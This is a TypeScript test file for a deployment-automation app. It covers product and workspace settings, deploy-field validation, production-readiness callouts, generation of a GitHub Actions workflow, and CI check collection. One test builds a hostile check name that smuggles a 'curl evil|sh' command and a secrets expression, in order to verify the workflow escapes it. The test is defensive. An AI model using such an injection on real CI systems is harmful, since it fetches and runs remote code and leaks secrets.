import type { Payload } from 'payload'
import { FakeBackend } from '@bauherr/adapters'
import { afterAll, beforeAll, expect, it, vi } from 'vitest'
import { deployErrors, productionCallouts, productionWorkflow, setupOf } from '../src/app/(app)/lib/product-setup'
import { createTestDb, type TestDb } from './helpers/test-db'

let payload: Payload
const o = { overrideAccess: true } as const
vi.mock('../src/app/(app)/lib/session', () => ({ payloadClient: async () => payload, workspacesOf: async () => [] }))

let testDb: TestDb
beforeAll(async () => {
  testDb = await createTestDb('product_settings')
  process.env.DATABASE_URL = testDb.url
  process.env.PAYLOAD_SECRET ??= 'test-secret'
  process.env.ENCRYPTION_KEY ??= 'test-key'
  const { getPayload } = await import('payload')
  payload = await getPayload({ config: (await import('../src/payload.config')).default })
})

afterAll(async () => {
  await payload?.destroy()
  await testDb?.drop(payload)
})

it('loadProduct answers undefined for a Product of another Workspace and shows the effective production state', async () => {
  const { loadProduct } = await import('../src/app/(app)/lib/settings')
  const [mine, other] = await Promise.all(['ps-mine', 'ps-other'].map((slug) => payload.create({ collection: 'workspaces', data: { name: slug, slug }, ...o })))
  const product = await payload.create({ collection: 'products', data: { name: 'Shop', slug: 'shop', workspace: mine!.id as number }, ...o })
  expect(await loadProduct(other!.id as number, product.id as number)).toBeUndefined()
  const found = await loadProduct(mine!.id as number, product.id as number)
  expect(found?.product.deploy.productionGate).toBe(false)
  expect(found?.product.productionOn).toBe(true)
  expect(found?.workflow.forcesProduction).toBe(true)
  expect(found?.product.deploy.releaseMode).toBe('notes-only')
  expect(found?.product.setup.production).toBe('On, needs checks')
})

it('loadWorkspaceSettings offers the preset models and shows the first Connection\'s tiers as bare ids', async () => {
  const { loadWorkspaceSettings } = await import('../src/app/(app)/lib/settings')
  const workspace = (await payload.create({ collection: 'workspaces', data: { name: 'ps-tiers', slug: 'ps-tiers' }, ...o })).id as number
  await payload.create({ collection: 'connections', data: { name: 'Anthropic', kind: 'llm-provider', provider: 'anthropic', config: {}, secret: 'k', workspace }, ...o })
  await payload.create({ collection: 'connections', data: { name: 'Greenpt', kind: 'llm-provider', provider: 'greenpt', config: {}, secret: 'k', workspace }, ...o })
  await payload.update({ collection: 'workspaces', id: workspace, data: { modelByTier: { cheap: 'anthropic/claude-haiku-5-5', standard: 'greenpt/glm-5.3', strong: 'anthropic/claude-opus-5-5' } }, ...o })
  const w = await loadWorkspaceSettings(workspace)
  expect(w.modelChoices).toEqual(['claude-haiku-5-5', 'claude-sonnet-5-5', 'claude-opus-5-5'])
  expect(w.modelByTier).toEqual({ cheap: 'claude-haiku-5-5', standard: 'greenpt/glm-5.3', strong: 'claude-opus-5-5' })
})

const base = { repositories: [{}], sources: [{}], embedTokens: [], deploy: { stagingUrl: 'https://s.example.com', mode: 'observe-ci', webhookUrl: '', productionChecks: 'deploy-prod' } }

it('setupOf counts open steps and words the production approval', () => {
  expect(setupOf(base, true)).toMatchObject({ open: 0, production: 'On' })
  const open = setupOf({ ...base, repositories: [], deploy: { ...base.deploy, stagingUrl: '', productionChecks: '' } }, true)
  expect(open).toMatchObject({ open: 3, production: 'On, needs checks' })
  expect(open.rows.map((r) => r.word)).toEqual(['Needs setup', 'Needs setup', 'Done', 'Needs setup', 'Optional'])
  expect(setupOf({ ...base, deploy: { ...base.deploy, productionChecks: '' } }, false)).toMatchObject({ open: 0, production: 'Off' })
  expect(setupOf({ ...base, deploy: { ...base.deploy, mode: 'webhook' } }, true).rows[1]!.word).toBe('Needs setup')
})

it('deployErrors names each invalid field in plain words', () => {
  const ok = { stagingUrl: '', deployMode: 'observe-ci', deployWebhookUrl: '', productionWebhookUrl: '', productionGate: false, productionChecks: '' }
  expect(deployErrors(ok)).toEqual({})
  expect(deployErrors({ ...ok, deployMode: 'webhook' })).toEqual({
    deployWebhookUrl: 'Required when Bauherr calls your deploy hook.',
    stagingUrl: 'Required: Bauherr checks this address to see the deploy finished.',
  })
  expect(deployErrors({ ...ok, stagingUrl: 'ftp://x', productionGate: true })).toEqual({
    stagingUrl: 'Enter an address starting with https://.',
    productionChecks: 'Pick the check your production deploy reports. Without it, Bauherr cannot tell when the deploy finished.',
  })
})

const callout = (o: Partial<Parameters<typeof productionCallouts>[0]>) => productionCallouts({ on: true, checks: [], seen: [], notifiable: true, ...o })

it('productionCallouts words Off, Not ready, Almost ready and Ready', () => {
  expect(callout({ on: false, checks: ['deploy-production'] })).toMatchObject([{ tone: 'muted', lead: 'Off' }])
  expect(callout({})).toMatchObject([{ tone: 'warn', lead: 'Not ready' }])
  const almost = callout({ checks: ['deploy-production'], seen: ['lint'] })
  expect(almost).toMatchObject([{ tone: 'warn', lead: 'Almost ready' }])
  expect(almost[0]!.text).toContain('deploy-production has not reported on recent commits')
  expect(callout({ checks: ['deploy-production'], seen: ['lint', 'deploy-production'] })).toMatchObject([{ tone: 'ok', lead: 'Ready' }])
  const partial = callout({ checks: ['a', 'b'], seen: ['b'] })
  expect(partial[0]).toMatchObject({ lead: 'Almost ready' })
  expect(partial[0]!.text).toContain('a has not reported')
})

it('productionCallouts calls a check ready when the forge cannot be read, and warns when nobody can be notified', () => {
  expect(callout({ checks: ['deploy-production'], seen: null })).toMatchObject([{ lead: 'Ready', text: expect.stringContaining('not confirmed') }])
  expect(callout({ checks: ['deploy-production'], seen: null, notifiable: false }).map((c) => c.lead)).toEqual(['Ready', 'No approver'])
  expect(callout({ on: false, notifiable: false }).map((c) => c.lead)).toEqual(['Off'])
})

it('productionWorkflow reports the picked check on the Ticket merge commit', () => {
  const yaml = productionWorkflow(['deploy-production', 'notify-prod'])
  expect(yaml).toContain("github.event.label.name == 'bauherr:approved:production'")
  expect(yaml).toContain('        deploy-production\n        notify-prod\n')
  expect(yaml).toContain('head_sha="$SHA"')
  expect(yaml).toContain('--limit 200')
  // a hostile check name stays data: no shell command, no Actions expression
  const hostile = productionWorkflow(['x;curl evil|sh ${{ secrets.T }}'])
  expect(hostile).not.toContain('${{ secrets.T }}')
  expect(hostile).not.toMatch(/-f name=x/)
})

const ok = (name: string, id?: number) => ({ name, status: 'completed', conclusion: 'success', id })

it('collectChecks counts each name once per commit, sorts by how often it was seen, then by name', async () => {
  const { collectChecks } = await import('../src/app/(app)/lib/settings')
  const fake = new FakeBackend()
  fake.setCommits('acme/web', [1, 2, 3].map((n) => ({ sha: `c${n}`, message: `m${n}` })))
  fake.setChecks('acme/web', 'c1', [ok('lint'), ok('deploy-production'), { name: 'lint', status: 'completed', conclusion: 'failure', id: 5 }])
  fake.setChecks('acme/web', 'c2', [ok('lint'), ok('build')])
  fake.setChecks('acme/web', 'merge1', [ok('build')])
  const found = await collectChecks(fake.forge, 'acme/web', ['merge1', 'c1'])
  expect(found).toEqual([
    { name: 'build', seen: 2, of: 4, lastConclusion: 'success' },
    { name: 'lint', seen: 2, of: 4, lastConclusion: 'failure' },
    { name: 'deploy-production', seen: 1, of: 4, lastConclusion: 'success' },
  ])
})

it('collectChecks reads at most 10 commits, 5 of the default branch plus merge commits', async () => {
  const { collectChecks } = await import('../src/app/(app)/lib/settings')
  const fake = new FakeBackend()
  fake.setCommits('acme/web', Array.from({ length: 8 }, (_, n) => ({ sha: `c${n}`, message: '' })))
  const asked: string[] = []
  const forge = { ...fake.forge, listChecks: async (_r: string, sha: string) => (asked.push(sha), [ok('lint')]) }
  const found = await collectChecks(forge, 'acme/web', Array.from({ length: 9 }, (_, n) => `m${n}`))
  expect(asked).toHaveLength(10)
  expect(asked.slice(0, 5)).toEqual(['c0', 'c1', 'c2', 'c3', 'c4'])
  expect(found).toEqual([{ name: 'lint', seen: 10, of: 10, lastConclusion: 'success' }])
})

it('collectChecks answers null when the forge fails or is too slow, and [] when nothing was reported', async () => {
  const { collectChecks } = await import('../src/app/(app)/lib/settings')
  const fake = new FakeBackend()
  fake.setCommits('acme/web', [{ sha: 'c1', message: '' }])
  const down = { ...fake.forge, listChecks: async () => { throw new Error('503') } }
  expect(await collectChecks(down, 'acme/web', [])).toBeNull()
  const slow = { ...fake.forge, getRepository: () => new Promise<never>(() => {}) }
  expect(await collectChecks(slow, 'acme/web', [], 20)).toBeNull()
  expect(await collectChecks(fake.forge, 'acme/web', [])).toEqual([])
})

it('recentChecks answers null for a Product without a ticket source, so the picker falls back to typing', async () => {
  const { recentChecks } = await import('../src/app/(app)/lib/settings')
  const ws = await payload.create({ collection: 'workspaces', data: { name: 'rc', slug: 'rc-ws' }, ...o })
  const product = await payload.create({ collection: 'products', data: { name: 'Plain', slug: 'plain', workspace: ws.id as number }, ...o })
  expect(await recentChecks(product.id as number)).toBeNull()
})

it('loadProducts shows the stored overlap suggestions (minus listed paths) with their time and makes no forge call', async () => {
  const { loadProducts } = await import('../src/app/(app)/lib/settings')
  const workspace = (await payload.create({ collection: 'workspaces', data: { name: 'wf', slug: 'wf-ws' }, ...o })).id as number
  const at = '2026-11-10T10:00:00.000Z'
  await payload.create({ collection: 'products', data: { name: 'None', slug: 'wf-none', workspace }, ...o })
  await payload.create({ collection: 'products', data: { name: 'Some', slug: 'wf-some', workspace, overlapIgnore: ['pnpm-lock.yaml'], overlapSuggestions: { at, items: [{ path: 'pnpm-lock.yaml', percent: 40 }, { path: 'CHANGELOG.md', percent: 30 }] } }, ...o } as never)
  const { products } = await loadProducts(workspace)
  expect(products.map((p) => [p.name, p.overlap.suggestedAt, p.overlap.suggestions])).toEqual([['None', null, []], ['Some', at, [{ path: 'CHANGELOG.md', percent: 30 }]]])
})
